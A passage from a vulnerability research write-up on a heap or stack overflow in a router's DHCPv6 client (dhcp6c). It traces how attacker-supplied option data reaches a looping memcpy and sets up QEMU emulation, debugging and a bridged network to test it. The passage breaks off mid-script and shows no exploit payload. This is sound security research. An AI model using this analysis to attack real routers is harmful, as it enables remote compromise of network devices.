</span></span></code></pre></div><p>It is now more clear. As <code>cp</code> is of the type <code>dhcp6opt</code> defined earlier, if we can control it, we can control how many bytes to write into <code>optinfo</code> and possibly overflow it because we can write multiple times we can write to <code>optinfo</code> and reach it ends. But from our earlier analysis, we know that <code>cp</code> is the pointer to the beginning of our <code>AFTR_NAME</code> options raw data and this pointer is obtained from the <code>p</code> passed as the first argument to <code>dhcp6_get_options</code>. So if we can control <code>p</code> which is the start of all options passed, we can control how many bytes to write into <code>optinfo</code>. And as the <code>memcpy</code> is in for-loop and the destination address grows by the number of bytes we wrote earlier, we can write many times until we reach the end of <code>optinfo</code> and possibly cause the overflow.</p>
<p>Let&rsquo;s find a way to control this parameter. But before that, we need to figure out how to reach this function. After digging around the OPNsense project, we found that the only place where the<code>dhcp6_get_options</code> function is called  is in <a href="https://github.com/opnsense/dhcp6c/blob/94c633227403aa02e86260943b08803f2ece4657/dhcp6c.c#L1213"><code>client6_recv</code> function</a>. This function handles the received packets.  After some analysis of the code, we note that the received packet is used to construct  <code>p</code> and <code>ep</code> that get passed to <code>dhcp6_get_options</code> function.</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241030022048.png"/><figcaption><h4> </h4></figcaption></figure>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">client6_recv</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> rbuf[BUFSIZ], cmsgbuf[BUFSIZ];
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> msghdr mhdr;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> iovec iov;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> sockaddr_storage from;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> dhcp6_if <span style="color:#f92672">*</span>ifp;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> dhcp6opt <span style="color:#f92672">*</span>p, <span style="color:#f92672">*</span>ep;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> dhcp6_optinfo optinfo;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">ssize_t</span> len;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> dhcp6 <span style="color:#f92672">*</span>dh6;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> cmsghdr <span style="color:#f92672">*</span>cm;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> in6_pktinfo <span style="color:#f92672">*</span>pi <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">memset</span>(<span style="color:#f92672">&amp;</span>iov, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(iov));
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">memset</span>(<span style="color:#f92672">&amp;</span>mhdr, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(mhdr));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	iov.iov_base <span style="color:#f92672">=</span> (<span style="color:#66d9ef">caddr_t</span>)rbuf;
</span></span><span style="display:flex;"><span>	iov.iov_len <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(rbuf);
</span></span><span style="display:flex;"><span>	mhdr.msg_name <span style="color:#f92672">=</span> (<span style="color:#66d9ef">caddr_t</span>)<span style="color:#f92672">&amp;</span>from;
</span></span><span style="display:flex;"><span>	mhdr.msg_namelen <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(from);
</span></span><span style="display:flex;"><span>	mhdr.msg_iov <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>iov;
</span></span><span style="display:flex;"><span>	mhdr.msg_iovlen <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>	mhdr.msg_control <span style="color:#f92672">=</span> (<span style="color:#66d9ef">caddr_t</span>)cmsgbuf;
</span></span><span style="display:flex;"><span>	mhdr.msg_controllen <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(cmsgbuf);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> ((len <span style="color:#f92672">=</span> <span style="color:#a6e22e">recvmsg</span>(sock, <span style="color:#f92672">&amp;</span>mhdr, <span style="color:#ae81ff">0</span>)) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">d_printf</span>(LOG_ERR, FNAME, <span style="color:#e6db74">&#34;recvmsg: %s&#34;</span>, <span style="color:#a6e22e">strerror</span>(errno));
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">/* detect receiving interface */</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> (cm <span style="color:#f92672">=</span> (<span style="color:#66d9ef">struct</span> cmsghdr <span style="color:#f92672">*</span>)<span style="color:#a6e22e">CMSG_FIRSTHDR</span>(<span style="color:#f92672">&amp;</span>mhdr); cm;
</span></span><span style="display:flex;"><span>	     cm <span style="color:#f92672">=</span> (<span style="color:#66d9ef">struct</span> cmsghdr <span style="color:#f92672">*</span>)<span style="color:#a6e22e">CMSG_NXTHDR</span>(<span style="color:#f92672">&amp;</span>mhdr, cm)) {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (cm<span style="color:#f92672">-&gt;</span>cmsg_level <span style="color:#f92672">==</span> IPPROTO_IPV6 <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>		    cm<span style="color:#f92672">-&gt;</span>cmsg_type <span style="color:#f92672">==</span> IPV6_PKTINFO <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>		    cm<span style="color:#f92672">-&gt;</span>cmsg_len <span style="color:#f92672">==</span> <span style="color:#a6e22e">CMSG_LEN</span>(<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> in6_pktinfo))) {
</span></span><span style="display:flex;"><span>			pi <span style="color:#f92672">=</span> (<span style="color:#66d9ef">struct</span> in6_pktinfo <span style="color:#f92672">*</span>)(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)(<span style="color:#a6e22e">CMSG_DATA</span>(cm));
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (pi <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">d_printf</span>(LOG_NOTICE, FNAME, <span style="color:#e6db74">&#34;failed to get packet info&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> ((ifp <span style="color:#f92672">=</span> <span style="color:#a6e22e">find_ifconfbyid</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)pi<span style="color:#f92672">-&gt;</span>ipi6_ifindex)) <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">d_printf</span>(LOG_INFO, FNAME, <span style="color:#e6db74">&#34;unexpected interface (%d)&#34;</span>,
</span></span><span style="display:flex;"><span>		    (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)pi<span style="color:#f92672">-&gt;</span>ipi6_ifindex);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">size_t</span>)len <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#f92672">*</span>dh6)) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">d_printf</span>(LOG_INFO, FNAME, <span style="color:#e6db74">&#34;short packet (%d bytes)&#34;</span>, len);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	dh6 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">struct</span> dhcp6 <span style="color:#f92672">*</span>)rbuf;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">d_printf</span>(LOG_DEBUG, FNAME, <span style="color:#e6db74">&#34;receive %s from %s on %s&#34;</span>,
</span></span><span style="display:flex;"><span>	    <span style="color:#a6e22e">dhcp6msgstr</span>(dh6<span style="color:#f92672">-&gt;</span>dh6_msgtype),
</span></span><span style="display:flex;"><span>	    <span style="color:#a6e22e">addr2str</span>((<span style="color:#66d9ef">struct</span> sockaddr <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>from), ifp<span style="color:#f92672">-&gt;</span>ifname);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">/* get options */</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">dhcp6_init_options</span>(<span style="color:#f92672">&amp;</span>optinfo);
</span></span><span style="display:flex;"><span>	p <span style="color:#f92672">=</span> (<span style="color:#66d9ef">struct</span> dhcp6opt <span style="color:#f92672">*</span>)(dh6 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>	ep <span style="color:#f92672">=</span> (<span style="color:#66d9ef">struct</span> dhcp6opt <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)dh6 <span style="color:#f92672">+</span> len);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">dhcp6_get_options</span>(p, ep, <span style="color:#f92672">&amp;</span>optinfo) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">d_printf</span>(LOG_INFO, FNAME, <span style="color:#e6db74">&#34;failed to parse options&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">switch</span>(dh6<span style="color:#f92672">-&gt;</span>dh6_msgtype) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">case</span> DH6_ADVERTISE:
</span></span><span style="display:flex;"><span>		(<span style="color:#66d9ef">void</span>)<span style="color:#a6e22e">client6_recvadvert</span>(ifp, dh6, len, <span style="color:#f92672">&amp;</span>optinfo);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">case</span> DH6_REPLY:
</span></span><span style="display:flex;"><span>		(<span style="color:#66d9ef">void</span>)<span style="color:#a6e22e">client6_recvreply</span>(ifp, dh6, len, <span style="color:#f92672">&amp;</span>optinfo);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">d_printf</span>(LOG_INFO, FNAME, <span style="color:#e6db74">&#34;received an unexpected message (%s) &#34;</span>
</span></span><span style="display:flex;"><span>		    <span style="color:#e6db74">&#34;from %s&#34;</span>, <span style="color:#a6e22e">dhcp6msgstr</span>(dh6<span style="color:#f92672">-&gt;</span>dh6_msgtype),
</span></span><span style="display:flex;"><span>		    <span style="color:#a6e22e">addr2str</span>((<span style="color:#66d9ef">struct</span> sockaddr <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>from));
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">dhcp6_clear_options</span>(<span style="color:#f92672">&amp;</span>optinfo);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>We can easily guess here that the <code>p</code> pointer that get passed to <code>dhcp6_get_options</code> is indeed the pointer to the beginning of all DHCPv6 options raw data contains in the packets. We will confirm it later through dynamic analysis. So, if we can control how <code>p</code> is constructed, we can control the source and size argument of <code>memcpy</code>, and since we can write many times with destination pointer growing, we can potentially overwrite subsequent data. Let&rsquo;s switch to dynamic analysis, to analyze how <code>p</code> is constructed and how we can tweak it. But first, we need to set up our environment.</p>
<h4 id="dynamic-analysis">Dynamic analysis<a href="#dynamic-analysis" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h4>
<h5 id="environment-setup">Environment setup<a href="#environment-setup" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h5>
<p>At the beginning,  we wanted a full system emulation using QEMU. On the ZDI blog we found this <a href="https://www.zerodayinitiative.com/blog/2020/5/27/mindshare-how-to-just-emulate-it-with-qemu">blog post</a> which helps us to build our environment. We build our environment by downloading  <code>vmlinux-3.2.0-4-4kc-malta</code> kernel and <code>debian_wheezy_mipsel_standard.qcow2</code> images. Then we use the following command line to start the Qemu VM (Virtual Machine).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sudo qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mipsel_standard.qcow2 -append <span style="color:#e6db74">&#34;root=/dev/sda1 console=tty0&#34;</span> -net user,hostfwd<span style="color:#f92672">=</span>tcp::80-:80,hostfwd<span style="color:#f92672">=</span>tcp::443-:443,hostfwd<span style="color:#f92672">=</span>tcp::2222-:22 -net nic -nographic
</span></span></code></pre></div><p>Once in the Qemu VM, we use <code>scp</code> to transfer the Squashfs file system into the VM (we zipped it first and unzipped it once in the VM) and then we follow the next steps described in the ZDI blog post :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>cd squashfs-root/
</span></span><span style="display:flex;"><span>mount -o bind /sys/ sys/
</span></span><span style="display:flex;"><span>mount -o bind /proc/ proc/
</span></span><span style="display:flex;"><span>mount -o bind /dev/ dev/
</span></span><span style="display:flex;"><span>chroot . /bin/sh
</span></span></code></pre></div>

    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241023111922.png"/><figcaption><h4> </h4></figcaption></figure>
<p>We then check the <code>inittab</code> file to know how to start the router. According to this file, we need to execute the <code>/etc/init.d/rcS</code> file to start the router. But we didn&rsquo;t find such file.</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241016184850.png"/><figcaption><h4> </h4></figcaption></figure>
<p>After digging into the file system, we found that it was an OpenWrt based router.</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241016195946.png"/><figcaption><h4> </h4></figcaption></figure>
<p>We found online the boot process of an OpenWRT based router:  <a href="https://stackoverflow.com/questions/66544765/how-and-when-openwrts-procd-runs-init-scripts-in-etc-init-d">https://stackoverflow.com/questions/66544765/how-and-when-openwrts-procd-runs-init-scripts-in-etc-init-d</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span> <span style="color:#f92672">/</span>init <span style="color:#f92672">-</span> <span style="color:#f92672">&gt;</span> <span style="color:#f92672">/</span>sbin<span style="color:#f92672">/</span>init <span style="color:#f92672">-&gt;</span> <span style="color:#f92672">/</span>etc<span style="color:#f92672">/</span>preinit <span style="color:#f92672">-&gt;</span> <span style="color:#f92672">/</span>sbin<span style="color:#f92672">/</span>procd <span style="color:#f92672">-&gt;</span> <span style="color:#f92672">/</span>etc<span style="color:#f92672">/</span>rc.d<span style="color:#75715e">/*
</span></span></span></code></pre></div><p>So, we run the <code>/sbin/init</code> binary , but it seems not to start everything.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>or directory.
</span></span><span style="display:flex;"><span>cp: can<span style="color:#e6db74">&#39;t stat &#39;</span>/etc/avahi/services/http.service<span style="color:#e6db74">&#39;: No such file or directory
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">cp: can&#39;</span>t stat <span style="color:#e6db74">&#39;/etc/avahi/services/ssh.service&#39;</span>: No such file or directory
</span></span><span style="display:flex;"><span>cp: can<span style="color:#e6db74">&#39;t stat &#39;</span>/etc/config/https-dns-proxy<span style="color:#e6db74">&#39;: No such file or directory
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">cp: can&#39;</span>t stat <span style="color:#e6db74">&#39;/etc/config/openvpn-mgmt&#39;</span>: No such file or directory
</span></span><span style="display:flex;"><span>cp: can<span style="color:#e6db74">&#39;t stat &#39;</span>/etc/config/portal-mgmt<span style="color:#e6db74">&#39;: No such file or directory
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">cp: can&#39;</span>t stat <span style="color:#e6db74">&#39;/etc/ndppd.conf&#39;</span>: No such file or directory
</span></span><span style="display:flex;"><span>cp: can<span style="color:#e6db74">&#39;t stat &#39;</span>/etc/uhttpd.crt<span style="color:#e6db74">&#39;: No such file or directory
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">cp: can&#39;</span>t stat <span style="color:#e6db74">&#39;/etc/uhttpd.key&#39;</span>: No such file or directory
</span></span><span style="display:flex;"><span>Saved
</span></span></code></pre></div><p>As the advisory doesn&rsquo;t specify that a specific configuration is required to trigger the vulnerability, we decide to directly launch the <code>dhcp6c</code> client binary without emulating the full router. But we encounter an issue : <code>setsockopt SO_REUSEPORT not available</code>.
We later found that to fix this issue, we need  a kernel version greater or equal to <code>3.9</code>:</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241017234659.png"/><figcaption><h4> </h4></figcaption></figure>
<p>Debian Jessie was using kernel version 3.16, so we get an old kernel <a href="http://archive.debian.org/debian/dists/jessie/main/installer-mipsel/current/images/malta/netboot/vmlinux-3.16.0-6-4kc-malta">vmlinux-3.16.0-6-4kc-malta</a>, and readjust the Qemu startup script.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sudo qemu-system-mipsel -M malta -kernel vmlinux-3.16.0-6-4kc-malta -hda debian_wheezy_mipsel_standard.qcow2 -append <span style="color:#e6db74">&#34;root=/dev/sda1 console=tty0&#34;</span> -net user,hostfwd<span style="color:#f92672">=</span>tcp::80-:80,hostfwd<span style="color:#f92672">=</span>tcp::443-:443,hostfwd<span style="color:#f92672">=</span>tcp::2222-:22 -net nic -nographic
</span></span></code></pre></div><p>And then try to run the <code>dhcp6c</code> binary. It works.</p>
<pre tabindex="0"><code>/ # /usr/sbin/dhcp6c 
usage: dhcp6c [-c configfile] [-dDfi] [-p pid-file] [ -v vendor ] interface [interfaces...]
</code></pre><p>It works fine. It prints to us how to use the binary. We can see that we could pass a configuration file to it. We also need to specify the interface to use, it is mandatory.
To understand more how to use it, we search on internet and we see that there is also the options (<code>-dDf</code>) to print log and debugging messages (<a href="https://man.freebsd.org/cgi/man.cgi?query=dhcp6c">https://man.freebsd.org/cgi/man.cgi?query=dhcp6c</a>) and start it in foreground mode.</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241023120028.png"/><figcaption><h4> </h4></figcaption></figure>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241023120419.png"/><figcaption><h4> </h4></figcaption></figure>
<p>The <code>-i</code> option starts the binary with the specific configuration where the client broadcast an <code>Information-request</code> dhcp message and print log on stdout (confirmed after via wireshark).
We then start the binary with <code>-dDfi</code> options:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>/ <span style="color:#75715e"># /usr/sbin/dhcp6c -dDfi</span>
</span></span><span style="display:flex;"><span>usage: dhcp6c <span style="color:#f92672">[</span>-c configfile<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-dDfi<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-p pid-file<span style="color:#f92672">]</span> <span style="color:#f92672">[</span> -v vendor <span style="color:#f92672">]</span> interface <span style="color:#f92672">[</span>interfaces...<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/ <span style="color:#75715e"># /usr/sbin/dhcp6c -dDfi eth0</span>
</span></span><span style="display:flex;"><span>Oct/27/2024 13:53:48: gethwid: found an interface eth0 <span style="color:#66d9ef">for</span> DUID
</span></span><span style="display:flex;"><span>Oct/27/2024 13:53:48: get_duid: generated a new DUID: 00:03:00:01:52:54:00:12:34:56
</span></span><span style="display:flex;"><span>Oct/27/2024 13:53:48: dhcp6_ctl_authinit: failed to open /etc/dhcp6cctlkey: No such file or directory
</span></span><span style="display:flex;"><span>Oct/27/2024 13:53:48: client6_init: failed initialize control message authentication
</span></span><span style="display:flex;"><span>Oct/27/2024 13:53:48: client6_init: skip opening control port
</span></span><span style="display:flex;"><span>Oct/27/2024 13:53:48: client6_init: client6_init <span style="color:#ae81ff">502</span> client6_init succeed
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>client6_init <span style="color:#ae81ff">503</span> client6_init succeed
</span></span><span style="display:flex;"><span>Oct/27/2024 13:53:48: dhcp6_reset_timer: reset a timer on eth0, state<span style="color:#f92672">=</span>INIT, timeo<span style="color:#f92672">=</span>0, retrans<span style="color:#f92672">=</span><span style="color:#ae81ff">680</span>
</span></span><span style="display:flex;"><span>Oct/27/2024 13:53:49: client6_send: a new XID <span style="color:#f92672">(</span>a75986<span style="color:#f92672">)</span> is generated
</span></span><span style="display:flex;"><span>Oct/27/2024 13:53:49: copy_option: set client ID <span style="color:#f92672">(</span>len 10<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Oct/27/2024 13:53:49: copy_option: set elapsed time <span style="color:#f92672">(</span>len 2<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Oct/27/2024 13:53:49: client6_send: send information request to ff02::1:2%eth0
</span></span><span style="display:flex;"><span>Oct/27/2024 13:53:49: dhcp6_reset_timer: reset a timer on eth0, state<span style="color:#f92672">=</span>INFOREQ, timeo<span style="color:#f92672">=</span>0, retrans<span style="color:#f92672">=</span><span style="color:#ae81ff">1000</span>
</span></span><span style="display:flex;"><span>Oct/27/2024 13:53:49: client6_recv: receive reply from fec0::2 on eth0
</span></span><span style="display:flex;"><span>Oct/27/2024 13:53:49: dhcp6_get_options: get DHCP option client ID, len <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span>Oct/27/2024 13:53:49:   DUID: 00:03:00:01:52:54:00:12:34:56
</span></span><span style="display:flex;"><span>Oct/27/2024 13:53:49: client6_recvreply: no server ID option
</span></span><span style="display:flex;"><span>Oct/27/2024 13:53:50: copy_option: set client ID <span style="color:#f92672">(</span>len 10<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Oct/27/2024 13:53:50: copy_option: set elapsed time <span style="color:#f92672">(</span>len 2<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Oct/27/2024 13:53:50: client6_send: send information request to ff02::1:2%eth0
</span></span><span style="display:flex;"><span>Oct/27/2024 13:53:50: dhcp6_reset_timer: reset a timer on eth0, state<span style="color:#f92672">=</span>INFOREQ, timeo<span style="color:#f92672">=</span>1, retrans<span style="color:#f92672">=</span><span style="color:#ae81ff">1959</span>
</span></span><span style="display:flex;"><span>Oct/27/2024 13:53:50: client6_recv: receive reply from fec0::2 on eth0
</span></span><span style="display:flex;"><span>Oct/27/2024 13:53:50: dhcp6_get_options: get DHCP option client ID, len <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span>Oct/27/2024 13:53:50:   DUID: 00:03:00:01:52:54:00:12:34:56
</span></span><span style="display:flex;"><span>Oct/27/2024 13:53:50: client6_recvreply: no server ID option
</span></span><span style="display:flex;"><span>Oct/27/2024 13:53:52: copy_option: set client ID <span style="color:#f92672">(</span>len 10<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Oct/27/2024 13:53:52: copy_option: set elapsed time <span style="color:#f92672">(</span>len 2<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Oct/27/2024 13:53:52: client6_send: send information request to ff02::1:2%eth0
</span></span><span style="display:flex;"><span>Oct/27/2024 13:53:52: dhcp6_reset_timer: reset a timer on eth0, state<span style="color:#f92672">=</span>INFOREQ, timeo<span style="color:#f92672">=</span>2, retrans<span style="color:#f92672">=</span><span style="color:#ae81ff">3732</span>
</span></span><span style="display:flex;"><span>Oct/27/2024 13:53:52: client6_recv: receive reply from fec0::2 on eth0
</span></span><span style="display:flex;"><span>Oct/27/2024 13:53:52: dhcp6_get_options: get DHCP option client ID, len <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span>Oct/27/2024 13:53:52:   DUID: 00:03:00:01:52:54:00:12:34:56
</span></span><span style="display:flex;"><span>Oct/27/2024 13:53:52: client6_recvreply: no server ID option
</span></span></code></pre></div><p>We can see some debugging information. In particular we can see a call to <code>dhcp_get_options</code> and <code>client6_recv</code>, which confirms that using OPNsense project code for analysis was a good idea and we are on right path.
However, in the current configuration, the binary uses the default Qemu user networking stack, so we are using the Qemu internal DHCP server which is not under our control. As we are attacking an dhcp6 client we need to have a DHCPv6 server that can send response to each DHCPv6 requests sent by the client. So as mentioned in the advisory attacker needs to be network adjacent to the router to be able to send a DHCPv6 messages. We will simulate this configuration using Qemu and network bridge.</p>
<p>The first thing we need to do is to transfer a prebuilt statically linked <a href="https://github.com/stayliv3/gdb-static-cross/blob/master/prebuilt/gdbserver-7.7.1-mipsel-mips32-v1">gdbserver</a> to the qemu environment so we can easily debug the binary from our host.</p>
<p>Now we are going to simulate an environment where our host will be network adjacent to the router. The qemu VM will act as the router.
We will create a network bridge that allows the qemu virtual machine to communicate with our host system and the outside network. It&rsquo;s like the qemu VM representing the router and our host machine are connected to a switch and this switch is connected to the internet.
We then came up with the following bash script</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>sudo ip link set br0 down
</span></span><span style="display:flex;"><span>sudo brctl delbr br0
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sudo ifconfig enp0s31f6 down
</span></span><span style="display:flex;"><span>sudo brctl addbr br0
</span></span><span style="display:flex;"><span>sudo brctl addif br0 enp0s31f6
</span></span><span style="display:flex;"><span>sudo ifconfig br0 0.0.0.0 promisc up
</span></span><span style="display:flex;"><span>sudo ifconfig enp0s31f6 0.0.0.0 promisc up
</span></span><span style="display:flex;"><span>sudo dhclient br0
</span></span><span style="display:flex;"><span>sudo tunctl -t tap0
</span></span><span style="display:flex;"><span>sudo brctl addif br0 tap0
</span></span><span style="display:flex;"><span>sudo ifconfig tap0 0.0.0.0 promisc up
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sudo qemu-system-mipsel <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>-M malta -kernel vmlinux-3.16.0-6-4kc-malta <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>-hda debian_wheezy_mipsel_standard.qcow2 <span style="color:#ae81ff">\
